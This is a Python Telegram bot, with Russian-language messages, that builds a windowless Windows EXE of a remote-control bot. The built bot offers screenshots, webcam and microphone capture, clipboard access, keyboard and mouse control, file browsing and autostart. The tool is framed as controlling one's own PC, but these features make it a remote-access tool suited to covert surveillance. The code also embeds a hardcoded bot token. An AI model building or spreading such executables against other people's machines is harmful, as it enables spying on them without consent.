import os
import subprocess
import asyncio
import time
import shutil
import zipfile
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from dotenv import load_dotenv

# Загружаем переменные из .env
load_dotenv()

# Читаем токены из .env
TOKEN = os.getenv("BUILDER_BOT_TOKEN")
GOFILE_TOKENS = [
    os.getenv("GOFILE_TOKEN_1"),
    os.getenv("GOFILE_TOKEN_2")
]
current_token_index = 0

bot = Bot(token=TOKEN)
dp = Dispatcher()


def upload_to_gofile(file_path):
    """Загружает файл на Gofile.io с токеном."""
    global current_token_index

    for attempt in range(len(GOFILE_TOKENS)):
        token = GOFILE_TOKENS[current_token_index]

        try:
            with open(file_path, "rb") as f:
                response = requests.post(
                    "https://upload.gofile.io/uploadFile",
                    files={"file": f},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=120
                )

            if response.status_code == 401:
                # Токен не работает, пробуем следующий
                current_token_index = (current_token_index + 1) % len(GOFILE_TOKENS)
                continue

            response.raise_for_status()
            result = response.json()

            if result.get("status") == "ok":
                data = result.get("data", {})
                code = data.get("code") or data.get("id")
                if code:
                    return {"success": True, "url": f"https://gofile.io/d/{code}"}

            return {"success": False, "error": result.get("message", "Неизвестная ошибка")}

        except Exception as e:
            current_token_index = (current_token_index + 1) % len(GOFILE_TOKENS)
            continue

    return {"success": False, "error": "Все токены Gofile не работают"}


def upload_to_catbox(file_path):
    """Загружает файл на Catbox.moe (запасной вариант)."""
    try:
        with open(file_path, "rb") as f:
            response = requests.post(
                "https://catbox.moe/user/api.php",
                data={"reqtype": "fileupload", "userhash": ""},
                files={"fileToUpload": f},
                timeout=120
            )
        response.raise_for_status()

        if response.status_code == 200:
            url = response.text.strip()
            if url.startswith("http"):
                return {"success": True, "url": url}
        return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "👋 Привет! Я Билдер ботов для управления ПК.\n"
        "Я могу создать для тебя готовый .exe файл твоего бота.\n\n"
        "📋 <b>Возможности создаваемого бота:</b>\n"
        "├─ 📸 Скриншоты экрана\n"
        "├─ 📹 Фото с веб-камеры\n"
        "├─ 🎤 Запись звука с микрофона\n"
        "├─ 💻 Информация о системе (CPU, RAM, диск)\n"
        "├─ 📊 Мониторинг ресурсов\n"
        "├─ 🔊 Управление громкостью Windows\n"
        "├─ ⌨️ Ввод текста с клавиатуры\n"
        "├─ 🖱️ Управление мышью\n"
        "├─ 🪟 Управление окнами\n"
        "├─ ⚙️ Выключение/перезагрузка/сон\n"
        "├─ 📋 Буфер обмена\n"
        "├─ 📁 Проводник файлов\n"
        "└─ 🔄 Автозагрузка при старте Windows\n\n"
        "⚡ <b>Сборка: 30-60 секунд</b>\n\n"
        "🔧 <b>Просто отправь мне токен своего бота</b>\n"
        "и я создам для тебя готовый EXE файл!\n\n"
        "🗑 <b>/clean</b> — удалить все временные файлы\n\n"
        "⚠️ <b>Важно:</b> Никому не передавай этот токен!",
        parse_mode="HTML"
    )


@dp.message(Command("clean"))
async def clean_cmd(message: types.Message):
    """Удаляет все временные файлы сборки."""
    import glob
    
    confirm_msg = await message.answer("⏳ <b>Проверяю файлы...</b>", parse_mode="HTML")
    
    build_dirs = glob.glob("build_*")
    temp_files = glob.glob("*.spec")
    
    if not build_dirs and not temp_files:
        await confirm_msg.edit_text("✅ <b>Очистка не требуется!</b>\n\nВременные файлы не найдены.", parse_mode="HTML")
        return
    
    total_size = 0
    for d in build_dirs:
        for root, dirs, files in os.walk(d):
            for f in files:
                total_size += os.path.getsize(os.path.join(root, f))
    
    size_str = f"{total_size / (1024 * 1024):.1f} МБ"
    
    await confirm_msg.edit_text(
        f"🗑 <b>Найдено файлов для удаления:</b>\n\n"
        f"📁 <b>Папок:</b> {len(build_dirs)}\n"
        f"📄 <b>Файлов:</b> {len(temp_files)}\n"
        f"📊 <b>Общий размер:</b> {size_str}\n\n"
        "⏳ <b>Удаляю...</b>",
        parse_mode="HTML"
    )
    
    for d in build_dirs:
        try:
            shutil.rmtree(d)
        except Exception:
            pass
    
    for f in temp_files:
        try:
            os.remove(f)
        except Exception:
            pass
    
    await confirm_msg.edit_text("✅ <b>Очистка завершена!</b>\n\nВсе временные файлы удалены.", parse_mode="HTML")


@dp.message(F.text.startswith("http"))
async def not_token(message: types.Message):
    await message.answer(
        "❌ <b>Это не токен!</b>\n\n"
        "Токен выглядит как: <code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
        "🔑 Возьми токен у @BotFather в Telegram",
        parse_mode="HTML"
    )


@dp.message(F.text.count(":") == 1 and F.text.split(":")[0].isdigit())
async def build_bot(message: types.Message):
    token = message.text.strip()
    user_id = message.from_user.id

    if len(token.split(":")[0]) < 5 or len(token.split(":")[1]) < 10:
        await message.answer(
            "❌ <b>Неверный формат токена!</b>\n\n"
            "Токен должен выглядеть как:\n"
            "<code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
            "🔑 Возьми токен у @BotFather",
            parse_mode="HTML"
        )
        return

    # Запускаем сборку в фоне
    await message.answer(
        "✅ <b>Токен принят!</b>\n\n"
        "🚀 <b>Запуск компиляции...</b>\n\n"
        "⏱️ <b>Время:</b> 2-5 минут\n"
        "Я пришлю файл когда закончу.",
        parse_mode="HTML"
    )

    # Создаём задачу в фоне
    asyncio.create_task(background_build(message, token, user_id))


async def background_build(message: types.Message, token: str, user_id: int):
    """Фоновая сборка бота."""
    import glob

    status_msg = await message.answer(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[          ] 0%</code>\n\n"
        "📦 <b>Шаг 1/4:</b> Копирую шаблон...",
        parse_mode="HTML"
    )

    work_dir = f"build_{user_id}_{int(time.time())}"
    if not os.path.exists(work_dir):
        os.makedirs(work_dir)

    template_path = "main.py"
    if not os.path.exists(template_path):
        await status_msg.edit_text(
            "❌ <b>Ошибка!</b>\n\n"
            "Файл <code>main.py</code> не найден.",
            parse_mode="HTML"
        )
        return

    shutil.copy2(template_path, os.path.join(work_dir, "main.py"))

    with open(os.path.join(work_dir, "main.py"), "r", encoding="utf-8") as f:
        bot_code = f.read()

    bot_code = bot_code.replace('TOKEN = "8736760043:AAFymNRqvbZZiUABNb3-ZwJMneU1ndaJa2U"', f'TOKEN = "{token}"')
    bot_code = bot_code.replace('MY_ID = 1455766271', f'MY_ID = {user_id}')

    with open(os.path.join(work_dir, "main.py"), "w", encoding="utf-8") as f:
        f.write(bot_code)

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[===>      ] 25%</code>\n\n"
        "📦 <b>Шаг 2/4:</b> Устанавливаю зависимости...",
        parse_mode="HTML"
    )

    with open(os.path.join(work_dir, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("aiogram>=3.0.0\npyautogui\nopencv-python\npsutil\npyperclip\n")

    subprocess.run(
        ["pip", "install", "-r", "requirements.txt", "-q"],
        cwd=work_dir,
        check=True,
        capture_output=True
    )

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[=======>  ] 50%</code>\n\n"
        "🔨 <b>Шаг 3/4:</b> Компилирую в EXE...\n"
        "⏱️ 30-60 секунд.",
        parse_mode="HTML"
    )

    log_path = os.path.join(work_dir, "pyinstaller.log")

    try:
        # Оптимизированная сборка
        proc = await asyncio.to_thread(
            subprocess.Popen,
            [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--optimize=2",  # Оптимизация байт-кода
                "--noconfirm",  # Не спрашивать подтверждение
                "--hidden-import=cv2",
                "--hidden-import=pyautogui",
                "--hidden-import=aiogram",
                "--hidden-import=psutil",
                "--hidden-import=pyperclip",
                "--exclude-module=torch",
                "--exclude-module=tensorflow",
                "--exclude-module=transformers",
                "--exclude-module=nltk",
                "--exclude-module=sklearn",
                "--exclude-module=matplotlib",
                "--exclude-module=pandas",
                "main.py"
            ],
            cwd=work_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        stages = [
            (65, "🔨 Анализирую модули..."),
            (75, "📦 Собираю библиотеки..."),
            (85, "🗜️ Упаковываю в EXE..."),
            (95, "✅ Финализирую..."),
        ]
        stage_idx = 0

        for line in proc.stdout:
            with open(log_path, "a", encoding="utf-8") as log_file:
                log_file.write(line)

            # Даём боту "вздохнуть" чтобы не было таймаута
            await asyncio.sleep(0.1)

            if stage_idx < len(stages):
                percent, text = stages[stage_idx]
                if any(kw in line.lower() for kw in ["analyzing", "building", "collecting", "copying", "building pkg", "building exe"]):
                    bars = "=" * (percent // 10)
                    spaces = " " * (10 - len(bars))
                    try:
                        await status_msg.edit_text(
                            "🛠 <b>Собираю бота...</b>\n\n"
                            f"📊 <b>Прогресс:</b>\n"
                            f"<code>[{bars}{spaces}] {percent}%</code>\n\n"
                            f"{text}",
                            parse_mode="HTML"
                        )
                    except:
                        pass
                    stage_idx += 1

        # Ждём завершения процесса
        proc.wait(timeout=300)

        if proc.returncode != 0:
            # Читаем лог ошибки
            with open(log_path, "r", encoding="utf-8") as lf:
                error_log = lf.read()
            print(f"PyInstaller ERROR:\n{error_log}")
            raise Exception(f"PyInstaller код: {proc.returncode}\n\n{error_log[:1000]}")

    except asyncio.TimeoutError:
        await status_msg.edit_text(
            "❌ <b>Таймаут!</b>\n\nСборка > 5 минут.",
            parse_mode="HTML"
        )
        return
    except Exception as e:
        await status_msg.edit_text(
            f"❌ <b>Ошибка:</b> {e}",
            parse_mode="HTML"
        )
        return

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[==========] 100%</code>\n\n"
        "✅ <b>Готово!</b>",
        parse_mode="HTML"
    )

    exe_path = os.path.join(work_dir, "dist", "main.exe")
    if os.path.exists(exe_path):
        final_exe_name = f"BotForPC_{user_id}.exe"
        final_exe_path = os.path.join(work_dir, final_exe_name)
        shutil.copy(exe_path, final_exe_path)

        exe_size = os.path.getsize(final_exe_path) / (1024 * 1024)

        # Если файл < 45 МБ — отправляем в Telegram
        if exe_size < 45:
            await status_msg.delete()
            await message.answer_document(
                types.FSInputFile(final_exe_path),
                caption=(
                    f"✅ <b>Бот готов!</b>\n\n"
                    f"📦 <b>Размер:</b> {exe_size:.1f} МБ\n\n"
                    "📋 <b>Инструкция:</b>\n"
                    "1. Сохрани файл\n"
                    "2. Запусти на ПК\n"
                    "3. Бот добавится в автозагрузку\n\n"
                    "⚠️ Windows может спросить разрешение."
                ),
                parse_mode="HTML"
            )
        else:
            # Файл большой — сжимаем и загружаем на Catbox
            await status_msg.edit_text(
                "🛠 <b>Собираю бота...</b>\n\n"
                "📊 <b>Прогресс:</b>\n"
                "<code>[==========] 100%</code>\n\n"
                f"📦 <b>Размер:</b> {exe_size:.1f} МБ\n\n"
                "🗜️ <b>Сжимаю...</b>",
                parse_mode="HTML"
            )

            # Сжимаем в ZIP
            zip_path = os.path.join(work_dir, f"BotForPC_{user_id}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(final_exe_path, final_exe_name)

            zip_size = os.path.getsize(zip_path) / (1024 * 1024)

            await status_msg.edit_text(
                "🛠 <b>Собираю бота...</b>\n\n"
                "📊 <b>Прогресс:</b>\n"
                "<code>[==========] 100%</code>\n\n"
                f"📦 <b>Сжато:</b> {exe_size:.1f} МБ → {zip_size:.1f} МБ\n\n"
                "📤 <b>Загружаю на Catbox...</b>",
                parse_mode="HTML"
            )

            # Загружаем на файлообменник (Gofile → Catbox)
            await status_msg.edit_text(
                "🛠 <b>Собираю бота...</b>\n\n"
                "📊 <b>Прогресс:</b>\n"
                "<code>[==========] 100%</code>\n\n"
                f"📦 <b>Сжато:</b> {exe_size:.1f} МБ → {zip_size:.1f} МБ\n\n"
                "📤 <b>Загружаю на Gofile...</b>",
                parse_mode="HTML"
            )

            # Пробуем Gofile
            upload_result = upload_to_gofile(zip_path)

            # Если Gofile не сработал — пробуем Catbox
            if not upload_result["success"]:
                await status_msg.edit_text(
                    "🛠 <b>Собираю бота...</b>\n\n"
                    "📊 <b>Прогресс:</b>\n"
                    "<code>[==========] 100%</code>\n\n"
                    f"📦 <b>Сжато:</b> {exe_size:.1f} МБ → {zip_size:.1f} МБ\n\n"
                    "⚠️ Gofile не работает, пробую Catbox...",
                    parse_mode="HTML"
                )
                upload_result = upload_to_catbox(zip_path)

            if upload_result["success"]:
                await status_msg.delete()
                await message.answer(
                    f"✅ <b>Бот готов!</b>\n\n"
                    f"📦 <b>Размер:</b> {zip_size:.1f} МБ (ZIP)\n\n"
                    f"🔗 <b>Скачать:</b>\n{upload_result['url']}\n\n"
                    "📋 <b>Инструкция:</b>\n"
                    "1. Скачай ZIP\n"
                    "2. Распакуй\n"
                    "3. Запусти EXE\n\n"
                    "⚠️ Windows может спросить разрешение.",
                    parse_mode="HTML"
                )

                # Удаляем папку сборки через 30 секунд
                asyncio.create_task(cleanup_build(work_dir, message))
            else:
                await status_msg.edit_text(
                    "❌ <b>Ошибка загрузки!</b>\n\n"
                    f"📝 <b>Ошибка:</b> {upload_result['error']}\n\n"
                    "📁 <b>Файл:</b>\n"
                    f"<code>{final_exe_path}</code>",
                    parse_mode="HTML"
                )
    else:
        await status_msg.edit_text(
            "❌ <b>Ошибка!</b>\n\nНет .exe файла.",
            parse_mode="HTML"
        )


async def cleanup_build(work_dir: str, message: types.Message):
    """Удаляет папку сборки после отправки."""
    await asyncio.sleep(30)
    try:
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir)
            await message.answer(
                "🗑️ <b>Временные файлы удалены!</b>\n\n"
                "Папка сборки очищена для экономии места.",
                parse_mode="HTML"
            )
    except Exception as e:
        print(f"Ошибка очистки: {e}")


@dp.message(F.text)
async def text_handler(message: types.Message):
    await message.answer(
        "🤔 <b>Я не понял...</b>\n\n"
        "🔧 <b>Отправь мне токен бота</b> в формате:\n"
        "<code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
        "🔑 Токен можно получить у @BotFather",
        parse_mode="HTML"
    )


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
